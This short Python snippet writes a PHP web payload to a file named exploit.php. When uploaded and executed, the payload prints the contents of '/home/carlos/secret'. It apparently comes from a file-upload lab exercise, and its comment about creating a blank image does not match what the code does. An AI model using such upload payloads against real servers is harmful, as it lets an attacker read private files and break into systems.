payload = "<?php echo file_get_contents('/home/carlos/secret'); ?>"

# 1. Create a blank image (e.g., 100x100 white)
with open("exploit.php", "w") as f:
    f.write(payload)